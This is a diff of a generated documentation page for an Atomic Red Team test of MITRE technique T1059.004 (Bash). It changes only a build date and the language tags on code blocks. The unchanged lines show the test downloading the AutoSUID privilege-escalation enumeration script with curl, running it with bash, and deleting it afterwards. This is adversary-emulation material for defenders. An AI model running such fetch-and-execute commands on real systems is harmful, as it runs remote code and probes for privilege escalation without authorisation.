@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1059.004"
 attack_technique_name: "Command and Scripting Interpreter: Bash"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.004/T1059.004.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "sh"
 aliases:
   - "46274fc6-08a7-4956-861b-24cbbaa0503c"
@@ -57,13 +57,13 @@ AutoSUID must exist on disk at specified location (#{autosuid})
 
 ### Prerequisite Check
 
-```text
+```bash
 if [ -f #{autosuid} ]; then exit 0; else exit 1; fi;
 ```
 
 ### Get Prerequisite
 
-```text
+```bash
 curl --create-dirs #{autosuid_url} --output #{autosuid}
 ```
 
@@ -73,14 +73,14 @@ curl --create-dirs #{autosuid_url} --output #{autosuid}
 
 ### Command
 
-```sh
+```bash
 chmod +x #{autosuid}
 bash #{autosuid}
 ```
 
 ### Cleanup
 
-```sh
+```bash
 rm -rf #{autosuid}
 ```
 
